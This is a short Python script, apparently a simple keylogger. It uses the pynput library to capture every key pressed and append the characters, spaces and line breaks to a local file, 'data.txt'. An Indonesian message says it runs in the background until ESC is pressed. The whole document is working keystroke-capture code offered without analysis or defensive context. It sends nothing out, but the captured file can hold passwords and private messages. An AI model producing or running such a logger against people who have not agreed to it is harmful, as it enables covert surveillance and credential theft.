from pynput import keyboard

def on_press(key):
    try:
        with open("data.txt", "a") as file:
            file.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            with open("data.txt", "a") as file:
                file.write(" ")
        elif key == keyboard.Key.enter:
            with open("data.txt", "a") as file:
                file.write("\n")
        elif key == keyboard.Key.esc:
            return False  # STOP PROGRAM

print("Program berjalan di background. Tekan ESC untuk berhenti.")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
